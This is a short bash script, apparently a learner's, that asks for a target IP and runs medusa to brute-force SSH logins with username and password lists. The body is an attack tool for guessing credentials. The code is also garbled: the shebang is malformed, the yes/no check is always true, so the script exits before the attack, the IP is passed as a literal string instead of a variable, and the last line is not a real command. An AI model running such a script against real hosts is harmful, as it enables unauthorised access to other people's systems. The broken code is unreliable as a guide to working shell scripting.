#!bin/bash

# Prompt user a question
read -p "Do you know what you're doing?"

# Check reponse of user
if [ "question"="y" ]; then

	echo -read "I hope so. You're going to jail if you don't"
	exit
fi

# Prompt user for input
read -p "What is your target ip?" target_ip

# Run this commands with the target_ip provided
medusa -h "target_ip" -U usernames.txt -P password_list.txt -M ssh

run tel.net_"target_ip"
